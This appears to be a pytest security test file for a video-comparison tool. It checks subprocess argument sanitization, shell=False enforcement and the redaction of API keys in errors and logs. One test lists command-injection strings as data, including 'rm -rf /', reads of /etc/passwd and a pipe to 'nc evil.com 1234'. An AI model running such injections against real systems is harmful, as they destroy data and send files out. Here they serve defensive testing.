"""Security tests for subprocess argument sanitization.

Verifies that subprocess calls sanitize arguments against shell metacharacters
and control characters per FC-3010 and FC-3011.
"""

from __future__ import annotations

import subprocess
from unittest.mock import patch

import pytest

from frame_compare.errors import ErrorContext, InputError, TmdbError
from frame_compare.utils.logging import redact_secrets_processor
from frame_compare.utils.subproc import run_subprocess, sanitize_arg


@pytest.mark.tier_a
class TestSubprocessSanitization:
    """Tests for subprocess argument sanitization (FC-3010, FC-3011)."""

    def test_shell_metacharacter_rejected(self) -> None:
        """Shell metacharacters in arguments must raise InputError(FC-3010)."""
        dangerous_inputs = [
            "file.mkv; rm -rf /",
            "file.mkv && cat /etc/passwd",
            "file.mkv | nc evil.com 1234",
            "$(whoami)",
            "`id`",
            "file.mkv > /dev/null",
            "file.mkv < /etc/passwd",
        ]

        for dangerous in dangerous_inputs:
            with pytest.raises(InputError) as exc:
                sanitize_arg(dangerous)

            assert exc.value.code == "FC-3010", f"Failed for: {dangerous}"
            assert exc.value.context.name == "INVALID_SUBPROCESS_ARG"
            assert "invalid character" in exc.value.context.message.lower()

    def test_control_characters_rejected(self) -> None:
        """Control characters in arguments must raise InputError(FC-3011)."""
        dangerous_inputs = [
            "file\x00.mkv",  # null byte
            "file\n.mkv",  # newline
            "file\r.mkv",  # carriage return
            "file\t.mkv",  # tab (may be allowed depending on policy)
        ]

        for dangerous in dangerous_inputs:
            with pytest.raises(InputError) as exc:
                sanitize_arg(dangerous)

            assert exc.value.code == "FC-3011", f"Failed for: {dangerous!r}"
            assert exc.value.context.name == "CONTROL_CHAR_IN_ARG"

    def test_shell_false_enforced(self) -> None:
        """run_subprocess must use shell=False."""
        with patch.object(subprocess, "run") as mock_run:
            mock_run.return_value = subprocess.CompletedProcess(
                args=["echo", "test"], returncode=0, stdout=b"test", stderr=b""
            )

            run_subprocess(["echo", "test"])

            # Verify shell=False was passed (default, but should be explicit)
            call_kwargs = mock_run.call_args.kwargs if mock_run.call_args.kwargs else {}
            assert call_kwargs.get("shell", False) is False

    def test_safe_path_accepted(self) -> None:
        """Normal paths should pass sanitization."""
        safe_inputs = [
            "/path/to/file.mkv",
            "comparison_videos/source.mp4",
            "My Movie (2024) - 1080p.mkv",
            "file with spaces.mkv",
            "日本語ファイル.mkv",  # Unicode
        ]

        for safe in safe_inputs:
            result = sanitize_arg(safe)
            assert result == safe


@pytest.mark.tier_a
class TestSecretsRedaction:
    """Tests for API key and secrets handling."""

    def test_api_key_not_in_error_message(self) -> None:
        """API keys must never appear in error messages."""
        api_key = "abc123secretkey456def"

        # Simulate error with key in details
        error = TmdbError(f"Request failed for key={api_key}")

        # Key should not appear in string representation
        error_str = str(error)
        assert api_key not in error_str, "API key leaked in error message"

    def test_error_details_redact_sensitive_keys(self) -> None:
        """ErrorContext.to_dict() must redact sensitive fields."""
        context = ErrorContext(
            code="FC-5005",
            name="TMDB_ERROR",
            message="TMDB API error",
            details={
                "api_key": "secret123",
                "password": "hunter2",
                "token": "bearer_xyz",
                "url": "https://api.example.com",  # Non-sensitive, keep
            },
        )

        result = context.to_dict()
        details = result.get("details", {})

        # Sensitive keys should be redacted
        assert details.get("api_key") == "[REDACTED]"
        assert details.get("password") == "[REDACTED]"
        assert details.get("token") == "[REDACTED]"
        # Non-sensitive should remain
        assert details.get("url") == "https://api.example.com"

    def test_logging_redacts_secrets(self) -> None:
        """Log output must not contain API keys."""
        # Test the redaction processor directly
        api_key = "super_secret_key_12345"

        # Create event dict with sensitive data
        event_dict = {
            "event": "Making request",
            "api_key": api_key,
            "url": "https://api.example.com",
        }

        # Apply redaction processor
        # The processor signature is (logger, method_name, event_dict) -> event_dict
        result = redact_secrets_processor(None, "info", event_dict.copy())  # type: ignore[arg-type]

        # Verify redaction
        assert result.get("api_key") == "[REDACTED]", "API key not redacted"
        assert result.get("url") == "https://api.example.com", "URL incorrectly redacted"
